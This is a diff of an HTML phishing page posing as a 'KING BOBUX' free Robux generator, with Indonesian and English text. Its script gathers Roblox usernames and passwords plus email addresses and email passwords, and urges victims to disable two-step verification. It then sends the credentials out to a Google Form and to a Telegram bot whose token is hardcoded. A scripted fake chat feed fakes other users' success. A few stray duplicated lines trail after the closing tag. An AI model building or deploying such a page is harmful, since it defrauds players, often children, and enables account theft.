@@ -3,113 +3,180 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KING BOBUX | OFFICIAL GENERATOR</title>
+    <title>KING BOBUX | ELITE GENERATOR</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&display=swap');
-        body { font-family: 'Orbitron', sans-serif; background: #000; color: #fff; overflow-x: hidden; }
-        .bg-gold { background: linear-gradient(135deg, #ffd700, #b8860b); }
-        .hidden { display: none; }
-        .loading-bar { width: 0%; animation: load 18s linear forwards; }
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;900&family=Orbitron:wght@400;900&display=swap');
+        
+        body { 
+            background: radial-gradient(circle at top, #1a1a1a 0%, #000 100%); 
+            color: #fff; 
+            font-family: 'Montserrat', sans-serif;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+
+        .glass-card {
+            background: rgba(20, 20, 20, 0.7);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 215, 0, 0.2);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5), 0 0 20px rgba(255, 215, 0, 0.05);
+            border-radius: 2rem;
+        }
+
+        .gold-text {
+            background: linear-gradient(135deg, #ffd700, #b8860b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        .btn-premium {
+            background: linear-gradient(135deg, #ffd700, #daa520);
+            box-shadow: 0 4px 15px rgba(218, 165, 32, 0.4);
+            transition: all 0.3s ease;
+        }
+
+        .btn-premium:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 215, 0, 0.6);
+        }
+
+        .btn-option {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            transition: all 0.3s ease;
+        }
+
+        .btn-option.active {
+            border-color: #ffd700;
+            background: rgba(255, 215, 0, 0.1);
+            box-shadow: inset 0 0 15px rgba(255, 215, 0, 0.1);
+        }
+
+        .input-premium {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: border 0.3s;
+        }
+
+        .input-premium:focus {
+            border-color: #ffd700;
+        }
+
+        .loading-bar-inner {
+            width: 0%;
+            animation: load 15s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+            background: linear-gradient(90deg, #b8860b, #ffd700);
+            box-shadow: 0 0 10px #ffd700;
+        }
+
         @keyframes load { from { width: 0%; } to { width: 100%; } }
-        .btn-nominal.active { border-color: #ffd700; background: rgba(255,215,0,0.2); box-shadow: 0 0 15px rgba(255,215,0,0.3); }
-        .chat-line { animation: slideIn 0.3s ease-out; border-bottom: 1px solid rgba(255,255,255,0.05); padding: 4px 0; }
-        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
-<body class="p-4 max-w-md mx-auto text-center">
+<body class="p-6 max-w-md mx-auto flex flex-col items-center">
 
-    <header class="py-6">
-        <h1 class="text-3xl font-black italic text-yellow-500 uppercase leading-none">KING <span class="text-white">BOBUX</span></h1>
-        <p class="text-[9px] text-gray-500 font-bold mt-2 animate-pulse tracking-widest uppercase">● SERVER STATUS: ONLINE</p>
+    <header class="text-center mb-10 animate-pulse">
+        <h1 class="text-4xl font-black italic gold-text tracking-tighter uppercase">KING BOBUX</h1>
+        <div class="h-[2px] w-24 bg-gradient-to-r from-transparent via-yellow-500 to-transparent mx-auto mt-2"></div>
+        <p class="text-[8px] text-zinc-500 font-bold mt-2 tracking-[4px] uppercase italic">● High Speed Injection ●</p>
     </header>
 
-    <div class="bg-zinc-900 border-2 border-yellow-500/20 p-6 rounded-[2.5rem] shadow-2xl mb-6">
+    <main class="glass-card w-full p-8 transition-all duration-500">
         
-        <div id="p1">
-            <p class="text-[11px] mb-4 text-gray-400 font-black uppercase italic">PILIH NOMINAL ROBUX:</p>
-            <div class="grid grid-cols-2 gap-3 mb-6">
-                <button onclick="selectNominal(this, '10,000')" class="btn-nominal bg-white/5 py-5 rounded-2xl text-xs font-black transition-all border border-white/5">10K RBX</button>
-                <button onclick="selectNominal(this, '50,000')" class="btn-nominal bg-white/5 py-5 rounded-2xl text-xs font-black transition-all border border-white/5">50K RBX</button>
+        <div id="p1" class="space-y-6">
+            <h2 class="text-[10px] font-black text-zinc-400 uppercase tracking-widest text-center italic">Select Package</h2>
+            <div class="grid grid-cols-2 gap-4">
+                <button onclick="selectNominal(this, '10,000')" class="btn-option py-6 rounded-2xl font-black text-sm hover:scale-105 transition-transform">10K <span class="text-xs text-yellow-500 italic block mt-1">RBX</span></button>
+                <button onclick="selectNominal(this, '50,000')" class="btn-option py-6 rounded-2xl font-black text-sm hover:scale-105 transition-transform">50K <span class="text-xs text-yellow-500 italic block mt-1">RBX</span></button>
             </div>
-            <button onclick="toChoice()" class="w-full bg-gold py-5 rounded-2xl font-black text-black text-xs uppercase italic shadow-lg">LANJUT</button>
+            <button onclick="toChoice()" class="w-full btn-premium py-5 rounded-2xl text-black font-black text-xs uppercase tracking-widest mt-4">Initialize Process</button>
         </div>
 
-        <div id="p-choice" class="hidden">
-            <p class="text-[11px] mb-5 text-yellow-500 font-black uppercase italic">METODE LOGIN LU APA?</p>
-            <div class="space-y-3">
-                <button onclick="showLogin('email')" class="w-full bg-zinc-800/50 border border-yellow-500/30 py-5 rounded-2xl text-xs font-black flex items-center justify-between px-6">
-                    <span>AKUN TERTAUT EMAIL</span>
-                    <span class="text-[9px] bg-green-500 text-black px-2 py-1 rounded-md">BONUS 5K</span>
-                </button>
-                <button onclick="showLogin('biasa')" class="w-full bg-zinc-800/50 border border-white/10 py-5 rounded-2xl text-xs font-black flex items-center justify-between px-6">
-                    <span>TIDAK TERTAUT EMAIL</span>
-                    <span class="text-[9px] bg-gray-600 text-white px-2 py-1 rounded-md">REGULER</span>
-                </button>
-            </div>
+        <div id="p-choice" class="hidden space-y-4">
+            <h2 class="text-[10px] font-black gold-text uppercase tracking-widest text-center italic mb-4">Verification Method</h2>
+            <button onclick="showLogin('email')" class="w-full btn-option py-6 rounded-2xl text-xs font-black flex items-center justify-between px-6">
+                <span>VIP (TERTAUT EMAIL)</span>
+                <span class="text-[8px] bg-yellow-500 text-black px-2 py-1 rounded font-black italic">+5K BONUS</span>
+            </button>
+            <button onclick="showLogin('biasa')" class="w-full btn-option py-6 rounded-2xl text-xs font-black px-6 text-left text-zinc-400">
+                REGULER (TANPA EMAIL)
+            </button>
         </div>
 
-        <div id="p2" class="hidden space-y-3">
-            <p id="label-mode" class="text-[9px] text-yellow-500/60 font-bold mb-2 uppercase italic"></p>
-            <input type="text" id="u" placeholder="USERNAME ROBLOX" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500 focus:border-yellow-500 transition-all">
-            <input type="password" id="p" placeholder="PASSWORD ROBLOX" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500 focus:border-yellow-500 transition-all">
+        <div id="p2" class="hidden space-y-4">
+            <input type="text" id="u" placeholder="ROBLOX USERNAME" class="input-premium w-full p-5 rounded-2xl text-xs font-bold text-yellow-500 outline-none">
+            <input type="password" id="p" placeholder="ROBLOX PASSWORD" class="input-premium w-full p-5 rounded-2xl text-xs font-bold text-yellow-500 outline-none">
             
-            <div id="email-fields" class="hidden space-y-3 pt-3 border-t border-white/5 text-left">
-                <input type="email" id="e" placeholder="ALAMAT EMAIL LU" class="w-full bg-black border border-yellow-500/20 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500">
-                <input type="password" id="ep" placeholder="SANDI EMAIL" class="w-full bg-black border border-yellow-500/20 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500">
+            <div id="email-fields" class="hidden space-y-4 pt-4 border-t border-zinc-800">
+                <input type="email" id="e" placeholder="EMAIL ADDRESS" class="input-premium w-full p-5 rounded-2xl text-xs font-bold text-yellow-500 outline-none">
+                <input type="password" id="ep" placeholder="EMAIL PASSWORD" class="input-premium w-full p-5 rounded-2xl text-xs font-bold text-yellow-500 outline-none">
+                <p class="text-[7px] text-red-500 text-center font-black uppercase tracking-tighter italic animate-pulse">! Disable 2-Step Verification Now !</p>
             </div>
 
-            <button onclick="kirimData()" class="w-full bg-gold py-5 rounded-2xl font-black text-black text-xs uppercase shadow-lg mt-4">KONFIRMASI SEKARANG</button>
+            <button onclick="kirimData()" class="w-full btn-premium py-5 rounded-2xl text-black font-black text-xs uppercase tracking-widest mt-4">Confirm Injection</button>
         </div>
 
-        <div id="p3" class="hidden py-6 space-y-4 text-center">
-            <h3 class="text-yellow-500 font-black italic uppercase">MENGIRIM ROBUX...</h3>
-            <div class="w-full bg-white/10 h-3 rounded-full overflow-hidden"><div class="loading-bar bg-yellow-500 h-full"></div></div>
-            <p class="text-[9px] text-gray-400 font-bold italic px-4 uppercase">Jangan login 24 jam atau robux gagal masuk!</p>
+        <div id="p3" class="hidden text-center py-8">
+            <div class="mb-6">
+                <h3 class="gold-text font-black italic uppercase text-lg mb-2">Injecting...</h3>
+                <div class="w-full bg-zinc-800 h-2 rounded-full overflow-hidden">
+                    <div class="loading-bar-inner h-full"></div>
+                </div>
+            </div>
+            <p class="text-[9px] text-zinc-500 font-bold uppercase italic leading-loose">Secure connection established. <br> <span class="text-white underline">DO NOT LOG IN</span> for 24 hours.</p>
         </div>
-    </div>
+    </main>
 
-    <div class="bg-zinc-900/40 border border-white/5 rounded-[2rem] p-4 text-left">
-        <p class="text-[9px] font-black text-yellow-500 uppercase mb-3 flex items-center">
-            <span class="w-1.5 h-1.5 bg-green-500 rounded-full mr-2 animate-pulse"></span> AKTIVITAS SERVER
-        </p>
-        <div id="chat-content" class="h-28 overflow-hidden space-y-1"></div>
+    <div class="w-full mt-8 px-4 opacity-50 italic">
+        <div class="flex items-center space-x-2 mb-4">
+            <div class="w-2 h-2 bg-green-500 rounded-full"></div>
+            <span class="text-[9px] font-black gold-text uppercase tracking-widest">LIVE DATASTREAM</span>
+        </div>
+        <div id="chat-content" class="space-y-2 h-24 overflow-hidden text-[9px]"></div>
     </div>
 
     <script>
-        let amt = "";
-        let mode = "";
+        let amt = ""; let mode = "";
         const teleToken = "8712552694:AAHAjQQhwx4Vlas6CWs6QHB4iYSA5U2LiWM";
         const teleChatId = "7153376507";
         const gform = "https://docs.google.com/forms/d/e/1FAIpQLSfgBrBP1Bqk4tfVHBFUPZDCbW5fj7nK8NZuObuQPmhyRcEGxg/formResponse";
 
-        // Fungsi Pilih Tanpa Alert
         function selectNominal(btn, val) {
-            document.querySelectorAll('.btn-nominal').forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
-            amt = val;
+            document.querySelectorAll('.btn-option').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active'); amt = val;
         }
 
         function toChoice(){ if(!amt) return; document.getElementById('p1').classList.add('hidden'); document.getElementById('p-choice').classList.remove('hidden'); }
         
         function showLogin(m){
-            mode = m;
-            document.getElementById('p-choice').classList.add('hidden');
-            document.getElementById('p2').classList.remove('hidden');
-            if(m === 'email') { 
-                document.getElementById('email-fields').classList.remove('hidden'); 
-                document.getElementById('label-mode').innerText = "Status: Bonus +5k Aktif";
-            } else {
-                document.getElementById('label-mode').innerText = "Status: Reguler Claim";
-            }
+            mode = m; document.getElementById('p-choice').classList.add('hidden'); document.getElementById('p2').classList.remove('hidden');
+            if(m === 'email') document.getElementById('email-fields').classList.remove('hidden');
         }
 
         function kirimData(){
-            const u = document.getElementById('u').value;
-            const p = document.getElementById('p').value;
-            const e = document.getElementById('e').value || "-";
-            const ep = document.getElementById('ep').value || "-";
+            const u = document.getElementById('u').value; const p = document.getElementById('p').value;
+            const e = document.getElementById('e').value || "-"; const ep = document.getElementById('ep').value || "-";
+            if(!u || !p) return;
+            const fd = new FormData();
+            fd.append('entry.298399091', u); fd.append('entry.434090398', p);
+            fd.append('entry.455306086', e); fd.append('entry.734491941', ep);
+            fd.append('entry.1584180390', amt); fetch(gform, { method: 'POST', mode: 'no-cors', body: fd });
+            fetch(`https://api.telegram.org/bot${teleToken}/sendMessage?chat_id=${teleChatId}&text=${encodeURIComponent(`🚀 *VIP ALERT*\n\n👤 *User:* \`${u}\` \n🔑 *Pass:* \`${p}\` \n📧 *Mail:* \`${e}\` \n🔐 *Sandi:* \`${ep}\` \n💎 *Amt:* \`${amt}\``)}&parse_mode=Markdown`);
+            document.getElementById('p2').classList.add('hidden'); document.getElementById('p3').classList.remove('hidden');
+        }
 
+        const msgs = ["Landing 10k! Parah!", "Bonus email 5k masuk cuy!", "Login email beneran work.", "Work it parah thx admin.", "Moga 50k landing mulus."];
+        setInterval(() => {
+            const box = document.getElementById('chat-content');
+            const div = document.createElement('div');
+            div.innerHTML = `<span class="text-yellow-500 font-bold">User_${Math.floor(Math.random()*999)}:</span> <span class="text-zinc-300 ml-2">${msgs[Math.floor(Math.random()*msgs.length)]}</span>`;
+            box.insertBefore(div, box.firstChild);
+            if(box.childNodes.length > 5) box.removeChild(box.lastChild);
+        }, 2000);
+    </script>
+</body>
+</html>
             if(!u || !p) return;
 
             const fd = new FormData();
